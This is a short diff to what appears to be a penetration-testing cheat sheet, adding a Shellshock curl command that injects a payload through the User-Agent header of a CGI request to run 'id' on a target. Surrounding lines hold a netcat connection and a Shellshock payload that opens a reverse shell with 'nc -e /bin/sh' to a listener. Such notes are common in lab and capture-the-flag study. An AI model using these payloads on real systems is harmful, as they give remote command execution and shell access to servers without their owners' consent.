@@ -151,6 +151,8 @@ nc -nv 10.11.25.59 4444
 ---------------------------------------------
 #shellshock:
 () { :; }; /bin/bash -c 'ping 3 192.168.1.52;nc 192.168.1.52 1234 -e /bin/sh'
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.1.57/cgi-bin/test.sh
+
 
 --------------------------------------------
 #Dirbuster
